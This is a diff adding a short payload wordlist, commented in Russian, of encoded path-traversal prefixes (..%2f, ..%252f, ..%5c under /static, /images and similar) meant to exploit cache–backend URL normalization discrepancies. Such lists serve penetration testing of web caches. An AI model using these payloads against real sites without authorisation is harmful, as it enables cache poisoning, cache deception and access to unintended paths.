@@ -1,0 +1,18 @@
+# Normalization Discrepancy — path traversal префиксы
+# Кэш видит /static/..%2fX, бэкенд нормализует в /X
+/static/..%2f
+/images/..%2f
+/assets/..%2f
+/js/..%2f
+/css/..%2f
+# Двойное кодирование
+/static/..%252f
+/images/..%252f
+/assets/..%252f
+# Обратные слеши (если бэкенд на Windows или нормализует \)
+/static/..%5c
+/images/..%5c
+# Без static dir — чистый path traversal с кодированием
+..%2f
+..%252f
+..%5c
